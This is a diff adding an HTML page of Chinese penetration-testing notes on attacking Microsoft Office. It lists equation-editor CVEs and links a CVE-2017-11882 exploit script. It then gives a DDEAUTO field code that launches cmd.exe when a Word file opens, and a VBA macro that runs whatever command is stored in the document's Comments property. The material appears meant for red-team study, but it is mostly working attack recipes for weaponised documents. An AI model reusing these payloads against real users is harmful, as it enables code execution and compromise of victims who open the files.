@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>Office</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>Office</h1><br/>漏洞：<br />CVE-2017-11882<br />CVE-2018-0802<br />CVE-2018-0798<br /><br /><br /><br />1、<br />ctrl+F9<br />输入域代码<br />DDEAUTO c:\\Windows\\System32\\cmd.exe &quot;/k ipconfig“ <br />打开word时自动打开cmd，可能需要交互<br /><br /><br /><br /><br />公式溢出自动执行代码脚本<br /><table style="display:inline-table"><tr><td><a href="EmbeddedFiles\154-CVE-2017-11882.py">Linked file: CVE-2017-11882.py </a></td></tr></table><br /><br /><br />2、<br />利用word注释和宏<br />添加Word文档的注释<br /><br /><a href=""><img src="images\154-1.png" alt="images\154-1.png" /></a><br /><br />添加宏<br /><span style="color:#7f7f7f;">Sub pentestlab()</span><br /><span style="color:#7f7f7f;">Dim p As DocumentProperty</span><br /><span style="color:#7f7f7f;">For Each p In ActiveDocument.BuiltInDocumentProperties</span><br /><span style="color:#7f7f7f;">If p.Name = &quot;Comments&quot; Then</span><br /><span style="color:#7f7f7f;">Shell (p.Value)</span><br /><span style="color:#7f7f7f;">End If</span><br /><span style="color:#7f7f7f;">Next</span><br /><span style="color:#7f7f7f;">End Sub</span><br /><br />当用户打开启用宏的Word文档，会运行命令<br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
